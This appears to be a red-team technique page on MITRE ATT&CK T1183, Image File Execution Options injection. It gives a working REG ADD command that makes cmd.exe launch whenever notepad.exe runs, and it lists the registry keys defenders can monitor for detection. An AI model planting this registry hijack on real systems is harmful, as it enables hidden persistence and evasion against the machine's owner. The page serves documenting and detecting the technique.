---
description: 'Defense Evasion, Persistence, Privilege Escalation'
---

# T1183: Image File Execution Options Injection

## Execution

Modifying registry to set cmd.exe as notepad.exe debugger, so that when notepad.exe is executed, it will actually start cmd.exe:

{% code title="attacker@victim" %}
```csharp
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /d "cmd.exe"
```
{% endcode %}

Launching a notepad on the victim system:

![](../../.gitbook/assets/ifeo-notepad.png)

Same from the cmd shell:

![](../../.gitbook/assets/ifeo-notepad2.png)

## Observations

Monitoring command line arguments and events modifying registry keys: `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options/<executable>` and `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable>` should be helpful in detecting this attack:

![](../../.gitbook/assets/ifeo-cmdline.png)

![](../../.gitbook/assets/ifeo-cmdline2.png)

## References

{% embed url="https://attack.mitre.org/wiki/Technique/T1183" %}

{% embed url="https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/" %}

{% embed url="https://blogs.msdn.microsoft.com/reiley/2011/07/29/a-debugging-approach-to-ifeo/" %}

